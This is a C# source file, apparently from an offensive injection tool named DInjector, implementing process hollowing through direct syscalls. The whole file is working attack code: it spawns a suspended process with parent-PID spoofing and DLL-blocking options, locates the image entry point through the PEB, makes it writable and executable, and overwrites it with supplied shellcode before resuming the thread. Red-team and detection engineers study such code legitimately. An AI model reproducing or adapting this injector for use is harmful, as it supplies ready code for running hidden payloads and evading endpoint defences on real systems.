using System;
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace DInjector
{
    class ProcessHollowing
    {
        public static void Execute(byte[] shellcode, string processImage, int ppid = 0, bool blockDlls = false, bool am51 = false, bool debug = false)
        {
            #region CreateProcessA

            var pi = SpawnProcess.Execute(
                processImage,
                @"C:\Windows\System32",
                suspended: true,
                ppid: ppid,
                blockDlls: blockDlls,
                am51: am51);

            #endregion

            #region NtQueryInformationProcess

            IntPtr hProcess = pi.hProcess;
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint returnLength = 0;

            // Query created process to extract its base address pointer from PEB (Process Environment Block)
            var ntstatus = Syscalls.NtQueryInformationProcess(
                hProcess,
                PROCESSINFOCLASS.ProcessBasicInformation,
                ref bi,
                (uint)(IntPtr.Size * 6),
                ref returnLength);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(ProcessHollowing) [+] NtQueryInformationProcess");
            else
                throw new Exception($"(ProcessHollowing) [-] NtQueryInformationProcess: {ntstatus}");

            #endregion

            #region NtReadVirtualMemory

            // Pointer to the base address of the EXE image: BASE_ADDR_PTR = PEB_ADDR + 0x10
            IntPtr ptrImageBaseAddress = (IntPtr)((Int64)bi.PebBaseAddress + 0x10);
            IntPtr baseAddress = Marshal.AllocHGlobal(IntPtr.Size);

            uint bytesRead = 0;

            // Read 8 bytes of memory (IntPtr.Size is 8 bytes for x64) pointed by the image base address pointer (ptrImageBaseAddress) in order to get the actual value of the image base address
            ntstatus = Syscalls.NtReadVirtualMemory(
                hProcess,
                ptrImageBaseAddress,
                baseAddress,
                (uint)IntPtr.Size,
                ref bytesRead);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(ProcessHollowing) [+] NtReadVirtualMemory");
            else
                throw new Exception($"(ProcessHollowing) [-] NtReadVirtualMemory: {ntstatus}");

            byte[] baseAddressBytes = new byte[bytesRead];
            Marshal.Copy(baseAddress, baseAddressBytes, 0, (int)bytesRead);
            Marshal.FreeHGlobal(baseAddress);

            // We're got bytes as a result of memory read, then converted them to Int64 and casted to IntPtr
            IntPtr imageBaseAddress = (IntPtr)(BitConverter.ToInt64(baseAddressBytes, 0));
            IntPtr data = Marshal.AllocHGlobal(0x200);

            bytesRead = 0;

            // Read 0x200 bytes of the loaded EXE image and parse PE structure to get the EntryPoint address
            ntstatus = Syscalls.NtReadVirtualMemory(
                hProcess,
                imageBaseAddress,
                data,
                0x200,
                ref bytesRead);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(ProcessHollowing) [+] NtReadVirtualMemory");
            else
                throw new Exception($"(ProcessHollowing) [-] NtReadVirtualMemory: {ntstatus}");

            byte[] dataBytes = new byte[bytesRead];
            Marshal.Copy(data, dataBytes, 0, (int)bytesRead);
            Marshal.FreeHGlobal(data);

            // "e_lfanew" field (4 bytes, UInt32; contains the offset for the PE header): e_lfanew = BASE_ADDR + 0x3C
            uint e_lfanew = BitConverter.ToUInt32(dataBytes, 0x3C);
            // EntryPoint RVA (Relative Virtual Address) offset: ENTRYPOINT_RVA_OFFSET = e_lfanew + 0x28
            uint entrypointRvaOffset = e_lfanew + 0x28;
            // EntryPoint RVA (4 bytes, UInt32; contains the offset for the executable EntryPoint address): ENTRYPOINT_RVA = BASE_ADDR + ENTRYPOINT_RVA_OFFSET
            uint entrypointRva = BitConverter.ToUInt32(dataBytes, (int)entrypointRvaOffset);
            // Absolute address of the executable EntryPoint: ENTRYPOINT_ADDR = BASE_ADDR + ENTRYPOINT_RVA
            IntPtr entrypointAddress = (IntPtr)((UInt64)imageBaseAddress + entrypointRva);

            #endregion

            #region NtProtectVirtualMemory (PAGE_EXECUTE_READWRITE)

            IntPtr protectAddress = entrypointAddress;
            IntPtr regionSize = (IntPtr)shellcode.Length;
            uint oldProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE,
                ref oldProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(ProcessHollowing) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READWRITE");
            else
                throw new Exception($"(ProcessHollowing) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READWRITE: {ntstatus}");

            #endregion

            #region NtWriteVirtualMemory (shellcode)

            var buffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);

            uint bytesWritten = 0;

            // Write the shellcode to the EntryPoint address
            ntstatus = Syscalls.NtWriteVirtualMemory(
                hProcess,
                entrypointAddress,
                buffer,
                (uint)shellcode.Length,
                ref bytesWritten);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(ProcessHollowing) [+] NtWriteVirtualMemory, shellcode");
            else
                throw new Exception($"(ProcessHollowing) [-] NtWriteVirtualMemory, shellcode: {ntstatus}");

            #endregion

            #region NtProtectVirtualMemory (oldProtect)

            protectAddress = entrypointAddress;
            regionSize = (IntPtr)shellcode.Length;
            uint tmpProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                oldProtect,
                ref tmpProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(ProcessHollowing) [+] NtProtectVirtualMemory, oldProtect");
            else
                throw new Exception($"(ProcessHollowing) [-] NtProtectVirtualMemory, oldProtect: {ntstatus}");

            #endregion

            #region NtResumeThread

            uint suspendCount = 0;

            ntstatus = Syscalls.NtResumeThread(
                pi.hThread,
                ref suspendCount);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(ProcessHollowing) [+] NtResumeThread");
            else
                throw new Exception($"(ProcessHollowing) [-] NtResumeThread: {ntstatus}");

            #endregion

            Syscalls.NtClose(pi.hThread);
            Syscalls.NtClose(hProcess);
        }
    }
}
